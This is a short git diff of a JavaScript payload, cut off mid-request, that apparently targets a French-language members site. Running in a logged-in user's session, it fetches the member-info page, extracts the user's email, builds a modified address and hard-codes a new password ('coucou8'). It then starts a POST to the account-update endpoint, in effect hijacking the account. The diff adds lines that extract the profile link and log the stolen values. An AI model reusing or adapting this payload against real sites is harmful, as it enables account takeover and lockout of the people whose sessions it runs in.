@@ -3,9 +3,11 @@ fetch('/membres/infos_membre.htm').then(function(response) {
 }).then(function(html) {
     let parser = new DOMParser();
     let doc = parser.parseFromString(html, 'text/html');
+    let profil = doc.evaluate('//*[@id="body_right"]/div/div/div/a', doc, null, XPathResult.STRING_TYPE, null).stringValue
     let mailpath = '//*[@id="form_user"]/fieldset[1]/div/table/tbody/tr[2]/td[2]/input/@value';
     let email = encodeURIComponent("mv" + doc.evaluate(mailpath, doc, null, XPathResult.STRING_TYPE, null).stringValue);
     let pwd = "coucou8";
+    console.log(profil, email, pwd);
     fetch("/membres/infos_membre.php", {
         "headers": {
             "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
